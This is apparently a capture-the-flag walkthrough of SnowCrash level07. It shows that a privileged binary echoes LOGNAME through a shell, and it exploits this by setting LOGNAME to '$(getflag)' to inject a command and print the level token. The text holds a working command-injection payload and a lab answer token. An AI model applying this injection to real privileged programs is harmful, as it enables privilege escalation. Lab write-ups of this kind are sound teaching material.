
in this level we got an executable called level07
let's execute it:
--------------------------------
level07@SnowCrash:~$ ./level07
level07
--------------------------------

so whatever we try the program always keep printing level07

let's try to check with strings:
--------------------------------
...
[^_]
LOGNAME
/bin/echo %s
;*2$"
...
--------------------------------

so the program echo the LOGNAME from the env
logically speaking we need just to override the LOGNAME
to get the flag.. and that's could be done if we make LOGNAME
equal to gerflag

so let's do it
--------------------------------
level07@SnowCrash:~$ printenv | grep LOGNAME
LOGNAME=level07
level07@SnowCrash:~$ export LOGNAME=\$\(getflag\)
level07@SnowCrash:~$ printenv | grep LOGNAME
LOGNAME=$(getflag)
--------------------------------

now that we override it let's execute the program:
--------------------------------
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
--------------------------------

Good! now let's go to the next level:
--------------------------------
level07@SnowCrash:~$ su level08
Password:
level08@SnowCrash:~$
--------------------------------
